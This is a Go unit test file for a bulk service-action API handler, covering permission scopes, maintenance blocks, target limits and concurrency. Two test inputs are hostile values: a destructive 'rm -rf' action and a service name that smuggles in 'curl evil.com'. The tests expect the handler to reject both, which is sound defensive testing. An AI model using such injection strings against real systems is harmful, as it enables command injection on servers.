package bulkpkg

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/labtether/labtether/internal/apiv2"
	"github.com/labtether/labtether/internal/hubapi/groupfeatures"
	"github.com/labtether/labtether/internal/hubapi/testutil"
)

// stubExec returns an ExecResult with no error for any call.
func stubExec(_ *http.Request, assetID, _ string, _ int) ExecResult {
	return ExecResult{AssetID: assetID, Stdout: "active", ExitCode: 0}
}

func newTestDeps() *Deps {
	return &Deps{
		AuditStore:  testutil.NewAuditStore(),
		ExecOnAsset: stubExec,
	}
}

func TestHandleV2BulkServiceAction_MethodNotAllowed(t *testing.T) {
	d := newTestDeps()
	req := httptest.NewRequest(http.MethodGet, "/api/v2/bulk/service-action", nil)
	rec := httptest.NewRecorder()
	d.HandleV2BulkServiceAction(rec, req)
	if rec.Code != http.StatusMethodNotAllowed {
		t.Fatalf("expected 405, got %d", rec.Code)
	}
}

func TestHandleV2BulkServiceAction_MissingScope(t *testing.T) {
	d := newTestDeps()
	body := `{"action":"restart","service":"nginx","targets":["srv1"]}`
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"assets:read"}) // bulk:* not granted
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()
	d.HandleV2BulkServiceAction(rec, req)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("expected 403 for missing scope, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestHandleV2BulkServiceAction_InvalidAction(t *testing.T) {
	d := newTestDeps()
	body := `{"action":"rm -rf","service":"nginx","targets":["srv1"]}`
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()
	d.HandleV2BulkServiceAction(rec, req)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for invalid action, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestHandleV2BulkServiceAction_InvalidServiceName(t *testing.T) {
	d := newTestDeps()
	body := `{"action":"restart","service":"nginx; curl evil.com","targets":["srv1"]}`
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()
	d.HandleV2BulkServiceAction(rec, req)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for injection attempt, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestHandleV2BulkServiceAction_AllTargetsDenied(t *testing.T) {
	d := newTestDeps()
	body := `{"action":"restart","service":"nginx","targets":["srv1","srv2"]}`
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
	ctx = apiv2.ContextWithAllowedAssets(ctx, []string{"other-server"}) // srv1/srv2 not allowed
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()
	d.HandleV2BulkServiceAction(rec, req)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestHandleV2BulkServiceAction_MissingFields(t *testing.T) {
	tests := []struct {
		name string
		body string
	}{
		{"empty action", `{"action":"","service":"nginx","targets":["srv1"]}`},
		{"empty service", `{"action":"restart","service":"","targets":["srv1"]}`},
		{"empty targets", `{"action":"restart","service":"nginx","targets":[]}`},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			d := newTestDeps()
			req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(tc.body))
			req.Header.Set("Content-Type", "application/json")
			ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
			req = req.WithContext(ctx)
			rec := httptest.NewRecorder()
			d.HandleV2BulkServiceAction(rec, req)
			if rec.Code != http.StatusBadRequest {
				t.Fatalf("expected 400, got %d: %s", rec.Code, rec.Body.String())
			}
		})
	}
}

func TestHandleV2BulkServiceAction_Success(t *testing.T) {
	d := newTestDeps()
	body := `{"action":"status","service":"nginx","targets":["srv1","srv2"]}`
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	// Wildcard allowed assets means all targets are permitted.
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
	ctx = apiv2.ContextWithAllowedAssets(ctx, nil) // nil = wildcard
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()
	d.HandleV2BulkServiceAction(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestHandleV2BulkServiceActionReportsNonzeroExitAsFailure(t *testing.T) {
	d := newTestDeps()
	d.ExecOnAsset = func(_ *http.Request, assetID, _ string, _ int) ExecResult {
		return ExecResult{AssetID: assetID, ExitCode: 1, Stdout: "service command failed"}
	}
	body := `{"action":"status","service":"missing-service","targets":["srv1"]}`
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
	ctx = apiv2.ContextWithAllowedAssets(ctx, nil)
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()

	d.HandleV2BulkServiceAction(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body=%s", rec.Code, rec.Body.String())
	}
	var response struct {
		Data struct {
			Results map[string]struct {
				Status   string `json:"status"`
				ExitCode int    `json:"exit_code"`
				Output   string `json:"output"`
			} `json:"results"`
		} `json:"data"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &response); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	result := response.Data.Results["srv1"]
	if result.Status != "failed" || result.ExitCode != 1 || result.Output != "service command failed" {
		t.Fatalf("result = %#v, want explicit nonzero-exit failure", result)
	}
}

func TestHandleV2BulkServiceAction_MaintenanceBlocksAllBeforeExecution(t *testing.T) {
	var callCount atomic.Int32
	d := newTestDeps()
	d.ExecOnAsset = func(_ *http.Request, assetID, _ string, _ int) ExecResult {
		callCount.Add(1)
		return ExecResult{AssetID: assetID}
	}
	d.EvaluateAssetGuardrails = func(assetID string, _ time.Time) (groupfeatures.GroupMaintenanceGuardrails, error) {
		return groupfeatures.GroupMaintenanceGuardrails{
			GroupID:      "group-1",
			BlockActions: assetID == "srv2",
		}, nil
	}
	body := `{"action":"restart","service":"nginx","targets":["srv1","srv2","srv3"]}`
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()

	d.HandleV2BulkServiceAction(rec, req)

	if rec.Code != http.StatusLocked {
		t.Fatalf("status = %d, want 423: %s", rec.Code, rec.Body.String())
	}
	if got := callCount.Load(); got != 0 {
		t.Fatalf("executions = %d, want zero when any target is maintenance-blocked", got)
	}
}

func TestHandleV2BulkServiceAction_RejectsDuplicateTargets(t *testing.T) {
	var callCount atomic.Int32
	d := &Deps{
		AuditStore: testutil.NewAuditStore(),
		ExecOnAsset: func(_ *http.Request, assetID, _ string, _ int) ExecResult {
			callCount.Add(1)
			return ExecResult{AssetID: assetID, Stdout: "ok"}
		},
	}
	body := `{"action":"status","service":"nginx","targets":["srv1","srv1"]}`
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
	ctx = apiv2.ContextWithAllowedAssets(ctx, nil)
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()

	d.HandleV2BulkServiceAction(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", rec.Code, rec.Body.String())
	}
	if got := callCount.Load(); got != 0 {
		t.Fatalf("expected 0 executions, got %d", got)
	}
}

func TestHandleV2BulkServiceAction_RejectsMixedForbiddenTargetsWithoutExecuting(t *testing.T) {
	var callCount atomic.Int32
	d := &Deps{
		AuditStore: testutil.NewAuditStore(),
		ExecOnAsset: func(_ *http.Request, assetID, _ string, _ int) ExecResult {
			callCount.Add(1)
			return ExecResult{AssetID: assetID, Stdout: "ok"}
		},
	}
	body := `{"action":"status","service":"nginx","targets":["srv1","srv2"]}`
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
	ctx = apiv2.ContextWithAllowedAssets(ctx, []string{"srv1"})
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()

	d.HandleV2BulkServiceAction(rec, req)

	if rec.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d: %s", rec.Code, rec.Body.String())
	}
	if got := callCount.Load(); got != 0 {
		t.Fatalf("expected 0 executions, got %d", got)
	}
}

func TestHandleV2BulkServiceAction_TrimsTargetsBeforeExecution(t *testing.T) {
	d := newTestDeps()
	body := `{"action":"status","service":"nginx","targets":[" srv1 ","srv2"]}`
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
	ctx = apiv2.ContextWithAllowedAssets(ctx, nil)
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()

	d.HandleV2BulkServiceAction(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", rec.Code, rec.Body.String())
	}
	var resp struct {
		Data struct {
			Results map[string]any `json:"results"`
		} `json:"data"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to decode response: %v", err)
	}
	if _, ok := resp.Data.Results["srv1"]; !ok {
		t.Fatalf("expected trimmed target key srv1 in results, got %v", resp.Data.Results)
	}
}

func TestHandleV2BulkServiceAction_ValidActionNames(t *testing.T) {
	for action := range validServiceActions {
		t.Run(action, func(t *testing.T) {
			d := newTestDeps()
			body := `{"action":"` + action + `","service":"nginx","targets":["srv1"]}`
			req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
			ctx = apiv2.ContextWithAllowedAssets(ctx, nil) // wildcard
			req = req.WithContext(ctx)
			rec := httptest.NewRecorder()
			d.HandleV2BulkServiceAction(rec, req)
			if rec.Code != http.StatusOK {
				t.Errorf("action %q: expected 200, got %d: %s", action, rec.Code, rec.Body.String())
			}
		})
	}
}

func TestHandleV2BulkServiceAction_RejectsExcessiveTargetsBeforeExecution(t *testing.T) {
	var callCount atomic.Int32
	d := &Deps{
		AuditStore: testutil.NewAuditStore(),
		ExecOnAsset: func(_ *http.Request, assetID, _ string, _ int) ExecResult {
			callCount.Add(1)
			return ExecResult{AssetID: assetID, Stdout: "ok"}
		},
	}
	targets := make([]string, maxBulkServiceRawTargets+1)
	for index := range targets {
		targets[index] = fmt.Sprintf("node-%02d", index)
	}
	body, err := json.Marshal(map[string]any{
		"action": "status", "service": "nginx", "targets": targets,
	})
	if err != nil {
		t.Fatalf("marshal request: %v", err)
	}
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(string(body)))
	req = req.WithContext(apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"}))
	rec := httptest.NewRecorder()

	d.HandleV2BulkServiceAction(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400; body=%s", rec.Code, rec.Body.String())
	}
	if got := callCount.Load(); got != 0 {
		t.Fatalf("execution backend called %d times for excessive targets", got)
	}
}

func TestHandleV2BulkServiceAction_CapsConcurrency(t *testing.T) {
	targets := make([]string, 24)
	for index := range targets {
		targets[index] = fmt.Sprintf("node-%02d", index)
	}

	var active atomic.Int32
	var maxActive atomic.Int32
	var callCount atomic.Int32
	d := &Deps{
		AuditStore: testutil.NewAuditStore(),
		ExecOnAsset: func(_ *http.Request, assetID, _ string, _ int) ExecResult {
			callCount.Add(1)
			current := active.Add(1)
			for {
				observed := maxActive.Load()
				if current <= observed || maxActive.CompareAndSwap(observed, current) {
					break
				}
			}
			time.Sleep(20 * time.Millisecond)
			active.Add(-1)
			return ExecResult{AssetID: assetID, Stdout: "ok"}
		},
	}
	body, err := json.Marshal(map[string]any{
		"action": "status", "service": "nginx", "targets": targets,
	})
	if err != nil {
		t.Fatalf("marshal request: %v", err)
	}
	req := httptest.NewRequest(http.MethodPost, "/api/v2/bulk/service-action", strings.NewReader(string(body)))
	ctx := apiv2.ContextWithScopes(req.Context(), []string{"bulk:*"})
	ctx = apiv2.ContextWithAllowedAssets(ctx, nil)
	req = req.WithContext(ctx)
	rec := httptest.NewRecorder()

	d.HandleV2BulkServiceAction(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body=%s", rec.Code, rec.Body.String())
	}
	if got := callCount.Load(); got != int32(len(targets)) {
		t.Fatalf("execution count = %d, want %d", got, len(targets))
	}
	if got := maxActive.Load(); got > maxBulkServiceConcurrency {
		t.Fatalf("max concurrency = %d, limit = %d", got, maxBulkServiceConcurrency)
	}
}
